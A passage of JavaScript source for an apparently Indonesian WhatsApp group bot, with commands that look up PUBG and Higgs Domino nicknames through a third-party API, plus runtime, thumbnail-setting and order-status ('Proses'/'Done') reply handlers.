            if (!q) return replyDeface(`Gunakan dengan cara ${prefix + command} *id*\n\n_Contoh_\n\n${command} 5217933016`)
            axios.get(`https://api.lolhuman.xyz/api/pubg/${q}?apikey=${apikey}`)
            .then(({data}) => {
            let pubg = `*🔎 PUBG MOBILE 🔍*

ID : ${q}
Nick : ${data.result}`
            replyDeface(pubg)
            limitAdd(sender, limit)
            })
            .catch((err) => {
                console.log(color('[ ERROR ]', 'red'), err)
                replyDeface(mess.error.api)
                setya.sendMessage(ownerNumber, { text: `${command} error : ${err}` })
            })
            break
        case 'higgsid':
        if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!q) return replyDeface(`Gunakan dengan cara ${prefix + command} *id*\n\n_Contoh_\n\n${command} 291756557`)
            axios.get(`https://api.lolhuman.xyz/api/higghdomino/${q}?apikey=${apikey}`)
            .then(({data}) => {
            let domino = `*🔎 HIGGS DOMINO 🔍*

ID : ${q}
Nick : ${data.result}`
            replyDeface(domino)
            })
            .catch((err) => {
                console.log(color('[ ERROR ]', 'red'), err)
                replyDeface(mess.error.api)
                setya.sendMessage(ownerNumber, { text: `${command} error : ${err}` })
            })
            break

// case 'asupan':
// if (!isGroup) return replyDeface(mess.OnlyGrup)
                // sock.sendMessage(from, { video: { url: `https://restapi.frteam.xyz/asupan?apikey=${apikey}` } })
            // break

case 'runtime':
var button = [{ buttonId: `.owner`, buttonText: { displayText: `OWNER` }, type: 1 }]
setya.sendMessage(from, { text: `${runtime(process.uptime())}`, buttons: button, footer: 'RUNTIME BOT' })
break

case 'setthumb':
if (!isOwner) return reply(`*Khusus Owner*`)
let medifa = await downloadAndSaveMediaMessage('image', `./temp/logo.jpg`)
replyDeface(`*Sukses SetThumb*`)
break

        default:
if ((budy) && ["p", "Proses", "P"].includes(budy) && !isCmd) {
if (!isGroup) return
if (!m.isQuotedMsg) return
if (!isOwner && !isGroupAdmins) return
let proses = `O━• *Transaksi Proses* •━O

${gy}🎉 Status : Pending
?? Mohon Di Tunggu
📆 ${tanggal}
⏰ ${jam}${gy}

✎📜 Pesanan : 
${rm.quoted.text}

📜 *Pesanan @${rm.quoted.sender.split("@")[0]} Pending Mohon Di Tunggu*
━O━O━••••••••••••━O━O━`
const getTextP = getTextSetProses(from, set_proses);
if (getTextP !== undefined) {
mentions(getTextP.replace('@pesanan', rm.quoted.text).replace('user', rm.quoted.sender.split("@")[0]).replace('@jam', jam).replace('@tanggal', tanggal), [rm.quoted.sender], true);
} else {
mentions(proses, [rm.quoted.sender], true)
}
}

if ((budy) && ["d", "Done", "D"].includes(budy) && !isCmd) {
if (!isGroup) return
if (!m.isQuotedMsg) return
if (!isOwner && !isGroupAdmins) return
let sukses = `O━• *Transaksi Sukses* •━O

${gy}🎉 Status : Sukses
📆 ${tanggal}
⏰ ${jam}${gy}

✎📜 Pesanan : 
${rm.quoted.text}

📜 *Pesanan @${rm.quoted.sender.split("@")[0]} Sudah Sukses*
━O━O━••••••••••••━O━O━`
const getTextD = getTextSetDone(from, set_done);
if (getTextD !== undefined) {
mentions(getTextD.replace('@pesanan', rm.quoted.text).replace('user', rm.quoted.sender.split("@")[0]).replace('@jam', jam).replace('@tanggal', tanggal), [rm.quoted.sender], true);
} else {
mentions(sukses, [rm.quoted.sender], true)
}
}

if ((budy) && ["bot", "Bot", "Bit"].includes(budy) && !isCmd) {
if (!isGroup) return 
const getTextBot = getTextSetBot(from, set_bot);
if (getTextBot !== undefined) {
setya.sendMessage(from, { text: getTextBot })
} else {
setya.sendMessage(from, { text: `Kenapa Sayang` })
}
}
          
    }
}
